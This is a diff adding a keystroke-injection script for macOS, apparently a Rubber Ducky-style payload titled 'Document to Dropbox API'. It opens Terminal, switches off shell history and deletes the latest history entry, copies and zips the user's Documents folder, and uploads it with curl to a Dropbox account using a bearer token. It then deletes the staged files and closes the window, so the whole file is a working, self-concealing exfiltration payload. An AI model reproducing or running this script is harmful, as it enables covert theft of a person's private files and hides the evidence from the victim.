@@ -1,0 +1,53 @@
+REM This script Creates a folder in the tmp directory
+REM copies the contents of the Documents into the tmp folder zips it 
+REM zips it and uploads it to a specific dropbox API 
+
+REM Replace "<API access token here>" with your actual API access token.
+
+REM Title: Document to Dropbox API 
+REM Author: Narsty
+REM Version 1.0 MacOs
+REM Category: Recon
+
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  mkdir -p /tmp/Backup/Documents
+ENTER
+DELAY 500
+STRING  cp -R ~/Documents/. /tmp/Backup/Documents
+ENTER
+DELAY 500
+STRING  cd /tmp/Backup && zip -r backup.zip Documents
+ENTER
+DELAY 500
+STRING  curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip
+DELAY 1000
+ENTER
+DELAY 10000
+STRING  rm /tmp/Backup/backup.zip
+ENTER
+DELAY 500
+STRING  rm -r /tmp/Backup/Documents
+ENTER
+DELAY 500
+STRING  clear
+DELAY 250
+ENTER
+DELAY 500
+GUI w
